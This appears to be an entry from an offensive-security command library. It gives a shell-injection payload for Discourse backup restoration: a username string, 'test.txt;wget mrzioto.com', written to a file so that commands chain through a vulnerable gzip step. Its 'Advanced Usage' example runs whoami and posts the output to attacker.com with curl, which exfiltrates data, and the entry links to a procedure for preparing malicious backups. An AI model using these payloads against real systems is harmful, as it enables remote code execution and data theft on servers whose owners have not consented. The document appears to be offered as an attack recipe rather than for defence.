---
id: cmd-inject-shell-payload
data: echo 'test.txt;wget mrzioto.com' > malicious_username.txt
tags:
  - injection
  - shell
type: command
output: Malicious username payload written to file for insertion into user data.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.558Z'
verified: false
validated: true
submitted: true
---
# inject-shell-payload

## Command

```bash
echo 'test.txt;wget mrzioto.com' > malicious_username.txt
```

## Description

Generates a malicious username string containing shell commands separated by ';' for injection into Discourse user data during backup modification, enabling command chaining in the vulnerable gzip execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `test.txt` | Creates a dummy file to demonstrate execution | Yes |
| `wget mrzioto.com` | Downloads content from a remote site as proof of RCE | Yes |
| `;` | Shell command separator | Yes |

## Examples

### Basic Usage

```bash
echo 'test.txt;wget mrzioto.com' > malicious_username.txt
```

### Advanced Usage

```bash
echo 'whoami > /tmp/whoami.txt;curl -d @/tmp/whoami.txt attacker.com' > advanced_payload.txt
```

## Expected Output

File `malicious_username.txt` created with the payload string, ready for manual insertion into extracted backup user files. No direct execution; used for later injection.

## Related

- [[commands/post-user-export]]
- [[procedures/Prepare-Malicious-Discourse-Backup]]
